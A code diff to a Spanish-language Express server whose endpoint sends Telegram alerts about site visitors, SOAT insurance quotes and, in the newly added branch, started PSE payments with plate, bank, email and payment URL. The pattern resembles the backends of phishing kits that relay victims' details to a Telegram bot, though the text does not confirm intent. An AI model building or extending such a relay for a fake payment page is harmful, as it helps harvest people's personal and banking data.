@@ -12,14 +12,13 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.post('/notificar', async (req, res) => {
   const datos = req.body;
-
   let mensaje = "";
 
   // 🚨 Mensaje para visita simple al sitio
   if (datos.tipo === "visita") {
     mensaje = "👀 *Nuevo visitante ingresó al sitio*";
 
-  // 📊 Mensaje para cotización (cuando presionan el botón "Cotizar")
+  // 📊 Mensaje para cotización
   } else if (datos.tipo === "cotizacion") {
     mensaje = `
 📊 *Nueva cotización de SOAT:*
@@ -28,6 +27,16 @@ app.post('/notificar', async (req, res) => {
 📌 *Subtipo:* ${datos.subtipo || 'N/A'}
 🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
 💰 *Valor estimado:* ${datos.valor || '$0'}
+`.trim();
+
+  // 🌐 Mensaje cuando se genera exitosamente una URL de PSE
+  } else if (datos.tipo === "url_ok") {
+    mensaje = `
+🌐 *Pago iniciado correctamente (PSE):*
+🚗 *Placa:* ${datos.placa || 'No proporcionada'}
+🏦 *Banco:* ${datos.banco || 'No especificado'}
+📧 *Correo:* ${datos.correo || 'N/A'}
+🔗 *URL:* ${datos.url || 'No disponible'}
 `.trim();
 
   // 📥 Mensaje completo al enviar el formulario
@@ -78,3 +87,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Servidor corriendo en el puerto ${PORT}`);
 });
+
